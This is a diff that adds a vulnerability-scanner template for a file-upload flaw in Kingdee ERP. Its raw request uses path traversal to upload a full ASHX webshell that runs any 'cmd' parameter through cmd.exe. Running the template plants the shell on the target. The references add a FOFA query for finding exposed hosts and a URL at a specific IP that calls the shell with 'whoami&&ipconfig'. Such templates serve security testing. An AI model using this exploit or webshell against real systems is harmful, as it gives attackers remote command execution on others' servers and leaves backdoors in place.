@@ -1,0 +1,54 @@
+http:
+- matchers:
+  - part: body
+    type: word
+    words:
+    - '"IsSuccess": true'
+  raw:
+  - "POST /k3cloud/SRM/ScpSupRegHandler HTTP/1.1\nHost: {{Hostname}}\nUser-Agent:\
+    \ Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)\
+    \ Chrome/113.0.0.0 Safari/537.36\nAccept-Encoding: gzip, deflate\nAccept: */*\n\
+    Connection: close\nContent-Type: multipart/form-data; boundary=2ac719f8e29343df94aa4ab49e456061\n\
+    Content-Length: 371\n\n--2ac719f8e29343df94aa4ab49e456061\nContent-Disposition:\
+    \ form-data; name=\"dbId_v\"\n\n.\n--2ac719f8e29343df94aa4ab49e456061\nContent-Disposition:\
+    \ form-data; name=\"FID\"\n\n2023\n--2ac719f8e29343df94aa4ab49e456061\nContent-Disposition:\
+    \ form-data; name=\"FAtt\"; filename=\"../../../../uploadfiles/{{a1}}\"Content-Type:\
+    \ text/plain\n\n<% @ webhandler language=\"C#\" class=\"AverageHandler\" %>\n\n\
+    using System;\nusing System.Web;\nusing System.Diagnostics;\nusing System.IO;\n\
+    \npublic class AverageHandler : IHttpHandler\n{\n  /* .Net requires this to be\
+    \ implemented */\n  public bool IsReusable\n  {\n    get { return true; }\n  }\n\
+    \n  /* main executing code */\n  public void ProcessRequest(HttpContext ctx)\n\
+    \  {\n    Uri url = new Uri(HttpContext.Current.Request.Url.Scheme + \"://\" +\
+    \   HttpContext.Current.Request.Url.Authority + HttpContext.Current.Request.RawUrl);\n\
+    \    string command = HttpUtility.ParseQueryString(url.Query).Get(\"cmd\");\n\n\
+    \    ctx.Response.Write(\"<form method='GET'>Command: <input name='cmd' value='\"\
+    +command+\"'><input type='submit' value='Run'></form>\");\n    ctx.Response.Write(\"\
+    <hr>\");\n    ctx.Response.Write(\"<pre>\");\n\n    /* command execution and output\
+    \ retrieval */\n    ProcessStartInfo psi = new ProcessStartInfo();\n    psi.FileName\
+    \ = \"cmd.exe\";\n    psi.Arguments = \"/c \"+command;\n    psi.RedirectStandardOutput\
+    \ = true;\n    psi.UseShellExecute = false;\n    Process p = Process.Start(psi);\n\
+    \    StreamReader stmrdr = p.StandardOutput;\n    string s = stmrdr.ReadToEnd();\n\
+    \    stmrdr.Close();\n\n    ctx.Response.Write(System.Web.HttpUtility.HtmlEncode(s));\n\
+    \    ctx.Response.Write(\"</pre>\");\n    ctx.Response.Write(\"<hr>\");\n }\n\
+    }\n--2ac719f8e29343df94aa4ab49e456061--\n"
+id: kingdee-erp-file_upload
+info:
+  author: vitasoy
+  description: Kingdee ERP has a kingdee-erp-file_upload vulnerability.
+  metadata:
+    fofa-query: "icon_hash=\"-1629133697\" && title==\"\u91D1\u8776\u4E91\u661F\u7A7A\
+      \""
+  name: kingdee-erp-file_upload
+  reference: 'https://github.com/yuziiiiiiiiii/Kingdee_k3cloud-ScpSupRegHandler-Upload-POC
+
+    https://peiqi.wgpsec.org/wiki/oa/%E9%87%91%E8%9D%B6OA/%E9%87%91%E8%9D%B6OA%20%E4%BA%91%E6%98%9F%E7%A9%BA%20ScpSupRegHandler%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E.html
+
+    https://github.com/yangbaopeng/ashx_webshell/blob/master/shell.ashx
+
+    http://124.71.115.20/k3cloud/uploadfiles/test.ashx?cmd=whoami%26%26ipconfig
+
+    '
+  severity: critical
+  tags: kingdee-erp
+variables:
+  a1: test.ashx.
